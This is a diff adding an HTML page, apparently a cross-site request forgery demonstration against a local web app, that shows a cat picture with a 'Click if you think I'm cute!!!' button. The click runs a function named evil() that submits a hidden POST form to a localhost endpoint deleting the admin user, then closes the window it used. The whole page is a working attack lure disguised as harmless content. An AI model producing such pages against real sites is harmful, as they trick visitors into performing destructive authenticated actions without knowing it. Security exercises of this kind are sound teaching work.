@@ -1,0 +1,28 @@
+<!DOCTYPE html>
+<html>
+<head lang="en">
+    <meta charset="UTF-8">
+    <title>Ima Cat Board</title>
+    <script src="https://code.jquery.com/jquery-1.11.3.min.js"></script>
+</head>
+<body>
+
+<script type="text/javascript">
+  function evil() {
+    // Can we delete the admin user?
+    var formElement = $('form');
+    formElement.submit();
+    formElement.target = 'evil_window';
+    setTimeout(function() {
+        window.open("", "evil_window").close();
+    }, 5);
+  }
+</script>
+
+<img src="https://images.duckduckgo.com/iu/?u=http%3A%2F%2Fwallpaperspoints.com%2Fwp-content%2Fuploads%2F2013%2F05%2Fcute-cat-picture-wallpaper.jpg&f=1">
+<form action="http://localhost:8080/vendor/delete/admin" method="post">
+  <input style="font-size: 36pt" type="submit" value="Click if you think I'm cute!!! :D" onclick="evil(); return false;">
+</form>
+
+</body>
+</html>
